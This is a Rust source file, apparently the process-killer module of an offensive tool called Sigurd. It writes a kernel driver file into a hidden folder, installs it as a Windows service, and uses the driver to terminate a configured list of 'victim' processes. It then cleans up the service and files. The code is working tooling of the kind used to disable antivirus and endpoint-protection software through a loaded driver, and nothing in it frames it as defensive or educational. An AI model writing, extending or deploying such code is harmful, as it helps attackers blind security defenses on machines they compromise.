use std::{
    thread, 
    path::Path, 
    time::Duration,
    fs::{self, remove_dir_all}
};

use crate::{
    drivers::KillerDriver, 
    error, info, success, trace, 
    killer::process::{get_pid, is_running}, 
    utils::{
        config::Config, 
        error::SigurdError, 
        fs::{find_storage, hidden_storage}, 
        service::{sc_create, sc_delete, sc_stop}
    }
};

pub mod process;

pub struct Killer {
    driver: Box<dyn KillerDriver>,
    config: Config,
    installed: Option<String>,
}

impl Killer {
    pub fn new(config: Config, drivers: Vec<Box<dyn KillerDriver>>) -> Result<Self, SigurdError> {
        // Check if driver is valid
        let mut driver = None;
        
        for optional_driver in drivers {
            if optional_driver.name() == config.driver_name {
                driver = Some(optional_driver)
            } else {
                continue;
            }
        };

        if driver.is_none() {
            return Err(SigurdError::default("Wrong driver name"));
        }

        // Check if install path exists
        if !Path::new(&config.installation_path).exists() {
            return Err(SigurdError::default("Installation path doesn't exist"));
        }

        // Check if victims is not empty
        if config.victim_processes.len() == 0 {
            return Err(SigurdError::default("Victim list is empty"));
        }

        return Ok(Self {
            driver: driver.unwrap(),
            config: config,
            installed: None
        });
    }

    pub fn init(&mut self) -> Result<(), SigurdError> {
        match self.driver.init() {
            Ok(b) => {
                match b {
                    true => {
                        return Ok(());
                    }
                    false => {
                        return Err(SigurdError::default(format!("Unable to initalize killer driver {}", self.driver.name()).as_str()))
                    }
                }
            }
            Err(e) => { Err(e) }
        }
    }

    pub fn install(&mut self) -> Result<(), SigurdError> {
        // Check if not installed before
        if self.installed.is_some() {
            return Err(SigurdError::default("Killer is installed"));
        }

        // Prep storage and values
        let name = self.driver.name();
        let driver_bytes = self.driver.get_file()?;
        let storage = hidden_storage(&self.config.installation_path)?;

        // Drop file on disk
        let file = storage.join(format!("{}.sys", name));
        fs::write(&file, &driver_bytes)?;
        let file_string = match file.to_str() {
            Some(s) => s.to_string(),
            None => {
                return Err(SigurdError::default("Can't convert secret storage path to string"));
            }
        };
        self.installed = Some(storage.to_str().unwrap().to_string());
        trace!("Storage path: {}", storage.to_str().unwrap().to_string());

        // Install a service
        match sc_create(name, &file_string) {
            Ok(created) => {
                if created {
                    info!("Killer driver installed");
                    return Ok(());
                } else {
                    let _r = remove_dir_all(storage)?;
                    match find_storage(&format!("{}.sys", name), &self.config.installation_path) {
                        Ok(s) => {
                            self.installed = Some(s.to_str().unwrap().to_string());
                            info!("Service restored");
                            return Ok(());
                        }
                        Err(_e) => {
                            return Err(SigurdError::default("Service installed, but wasnt able to locate driver file"));
                        }
                    }
                }
            }
            Err(e) => {
                self.installed = None; // First - null the path, so we know that killer is not installed
                // Then - remove dir. Even if it's not removed, it's more important to return error from sc_crate
                let _r = remove_dir_all(storage);
                return Err(e);
            }
        }
    }

    pub fn uninstall(&mut self) -> Result<(), SigurdError> {
        if self.installed.is_none() {
            return Err(SigurdError::default("Killer is not installed"));
        }
        
        // Stop and remove the service
        match sc_stop(self.driver.name()) {
            Ok(_) => {
                info!("Service stopped");
            }
            Err(e) => {
                return Err(e);
            }
        }
        
        match sc_delete(self.driver.name()) {
            Ok(_) => {
                info!("Service deleted");
            }
            Err(e) => {
                return Err(e);
            }
        }

        // Delete file and folder
        match remove_dir_all(self.installed.clone().unwrap()) {
            Ok(_) => {
                info!("Service folder removed");
                self.installed = None;
                return Ok(());
            }
            Err(e) => {
                return Err(e.into());
            }
        }
    }

    pub fn destruct(&mut self) -> Result<(), SigurdError> {
        match self.driver.destruct() {
            Ok(b) => {
                match b {
                    true => {
                        return Ok(());
                    }
                    false => {
                        return Err(SigurdError::default(format!("Can't destruct driver: {}", self.driver.name()).as_str()))
                    }
                }
            },
            Err(e) => {
                return Err(e);
            },
        }
    }

    pub fn kill(&mut self) -> Result<(), SigurdError> {
        if self.installed.is_none() {
            return Err(SigurdError::default("Killer not installed"));
        } 

        if self.config.victim_processes.len() == 0 {
            return Err(SigurdError::default("No targets providen"));
        }

        for target in &self.config.victim_processes {
            let pid = match get_pid(&target) {
                Ok(p) => p,
                Err(e) => {
                    if e.code == 1 {
                        info!("Target {} is not running", &target);
                        continue;
                    } else {
                        return Err(e);
                    }
                }
            };
            trace!("Killing {} with pid {}", target, pid);

            self.driver.kill(pid)?;
            for _ in 1..10 {
                if !is_running(&target)? {
                    success!("{} killed", target);
                    break;
                }
                thread::sleep(Duration::from_secs(1));
            }

            if is_running(&target)? {
                error!("{} kill attepmt failed with {}", target, self.driver.name());
            }
        }

        return Ok(());
    }
}

